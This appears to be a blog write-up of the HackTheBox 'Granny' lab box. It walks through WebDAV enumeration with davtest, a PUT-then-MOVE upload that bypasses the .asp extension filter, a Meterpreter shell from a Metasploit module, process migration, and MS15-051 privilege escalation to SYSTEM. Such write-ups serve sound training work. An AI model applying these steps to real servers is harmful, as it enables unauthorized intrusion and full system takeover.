---
title: "HackTheBox Writeup: Granny"
date: 2019-08-25T03:21:20+02:00
tags:
  - hackthebox
  - ctf
  - writeup
showdate: true
toc: true
---
{{%summary%}}
![img](/images/granny-writeup/1.png)
{{%/summary%}}

Granny is one of the easiest challenges on HackTheBox, it runs a very old version of Windows and this makes it vulnerable to many exploits, all of which are easy to run. When they were first released Granny and Grandpa were two good boxes to experiment with pivoting, however because of the new system implemented for virtual labs by the HackTheBox team this is no longer possible, as far as I'm aware. So I will only describe the standard steps to take to root the boxes individually, Grandpa will be covered in [the next post](/post/htb-writeup-grandpa/).

---

## Enumeration

As usual we begin with a quick look at the services running on the box with nmap, checking their versions (-sV) and executing a few default NSE scripts (-sC):

![img](/images/granny-writeup/2.png)

IIS 6.0 is running on port 80 and nothing else apparently, this very old version of IIS was being shipped by default on Windows Server 2003 so we can assume that's the OS we are dealing with. Also, WebDAV is enabled on IIS so we can try using [davtest](https://github.com/cldrn/davtest) to see if we can exploit some common WebDAV misconfigurations such as arbitrary file upload:

```shell-session
$ davtest -url http://10.10.10.15
```

![img](/images/granny-writeup/3a.png)

Many tests came out as positive, apparently we can use the PUT HTTP method to upload arbitrary files on the server under a few extensions, such as .php, .html, and .txt. Unfortunately we cannot upload .asp files, we know the server is powered by ASP.NET so uploading and executing an arbitrary .asp file on the browser would allow us to receive a shell, whatweb can tell us ASP.NET is supported, just to be 100% sure:

![img](/images/granny-writeup/3.png)

However one method which can be tried is uploading a .txt file with the PUT method, and then rename it with the MOVE method to give it the .asp extension later, bypassing the extension filter. We must check the availability of the MOVE method first though, davtest can do so with the -move flag:

```shell-session
┌──[baud@parrot]─[~/granny]
└──╼ $davtest -url http://10.10.10.15 -move
********************************************************
Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: rYTCBzbBQ12UMS
********************************************************
Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS
********************************************************
Sending test files (MOVE method)
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS_pl.txt
MOVE    pl      SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.pl
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS_cgi.txt
MOVE    cgi     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.cgi
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS_jhtml.txt
MOVE    jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.jhtml
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS_shtml.txt
MOVE    shtml   SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.shtml
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS_asp.txt
MOVE    asp     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.asp
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS_php.txt
MOVE    php     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.php
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS_jsp.txt
MOVE    jsp     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.jsp
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS_txt.txt
MOVE    txt     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.txt
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS_aspx.txt
MOVE    aspx    SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.aspx
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS_html.txt
MOVE    html    SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.html
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS_cfm.txt
MOVE    cfm     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.cfm
********************************************************
Checking for test file execution
EXEC    pl      FAIL
EXEC    cgi     FAIL
EXEC    jhtml   FAIL
EXEC    shtml   FAIL
EXEC    asp     FAIL
EXEC    php     FAIL
EXEC    jsp     FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.txt
EXEC    aspx    FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.html
EXEC    cfm     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS
MOVE/PUT File: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.pl
MOVE/PUT File: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.cgi
MOVE/PUT File: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.jhtml
MOVE/PUT File: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.shtml
MOVE/PUT File: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.asp
MOVE/PUT File: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.php
MOVE/PUT File: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.jsp
MOVE/PUT File: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.txt
MOVE/PUT File: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.aspx
MOVE/PUT File: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.html
MOVE/PUT File: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.cfm
Executes: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.txt
Executes: http://10.10.10.15/DavTestDir_rYTCBzbBQ12UMS/davtest_rYTCBzbBQ12UMS.html
```

---

## Exploitation: PUT + MOVE shell upload with Metasploit

The MOVE method is supported, the trick works. We can take advantage of this using the *iis_webdav_upload_asp* Metasploit module:

![img](/images/granny-writeup/4.png)

A Meterpreter session was successfully spawned, but I get access denied at every command I try to run:

```shell-session
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

I got this issue with Grandpa too and it makes the whole privilege escalation phase impossible if this little issue isn't solved first. Fixing it is actually very simple, we just have to migrate to a different process owned by our current user, I don't know the cause behind this problem but this is the fix nonetheless:

```shell-session
meterpreter > ps

Process List
============

PID   PPID  Name               Arch  Session  User                          Path
---   ----  ----               ----  -------  ----                          ----
0     0     [System Process]                                                
4     0     System                                                          
276   4     smss.exe                                                        
312   1076  cidaemon.exe                                                    
324   276   csrss.exe                                                       
348   276   winlogon.exe                                                    
396   348   services.exe                                                    
408   348   lsass.exe                                                       
568   1076  cidaemon.exe                                                    
596   396   svchost.exe                                                     
680   396   svchost.exe                                                     
740   396   svchost.exe                                                     
760   1076  cidaemon.exe                                                    
772   396   svchost.exe                                                     
800   396   svchost.exe                                                     
936   396   spoolsv.exe                                                     
964   396   msdtc.exe                                                       
1076  396   cisvc.exe                                                       
1124  396   svchost.exe                                                     
1180  396   inetinfo.exe                                                    
1216  396   svchost.exe                                                     
1328  396   VGAuthService.exe                                               
1408  396   vmtoolsd.exe                                                    
1460  396   svchost.exe                                                     
1604  396   svchost.exe                                                     
1700  396   alg.exe                                                         
1840  596   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
1912  396   dllhost.exe                                                     
2220  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
2288  596   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
2412  2220  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad0DCE5.tmp\svchost.exe
2428  596   wmiprvse.exe                                                    
2524  348   logon.scr                                                       

meterpreter > migrate 1840
[*] Migrating from 2412 to 1840...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
meterpreter >
```

Our process was initially PID 2412, which for some reason didn't inherit the user from the parent process. Migrating to any one of the three processes running under the network authority account does the job.

Anyway, because this is a very old box we can expect to find all sorts of unpatched local exploits, Metasploit's local_exploit_suggester can do the hard work for us:

![img](/images/granny-writeup/5.png)

---

## Privilege escalation: ms15_051_client_copy_image

I've used ms15_051_client_copy_image a few times before so I know it's reliable, I'm going to use that exploit and all I need to set is the proper Meterpreter session, local host and port (since 4444 is already in use by our current user shell, we don't want to spawn a new one on the same port):

![img](/images/granny-writeup/6.png)

And we are SYSTEM. We can now list the Documents and Settings directory to take a look at what users are on the box, Lakis' desktop will contain user.txt and root.txt will be in the Administrator's:

![img](/images/granny-writeup/7.png)
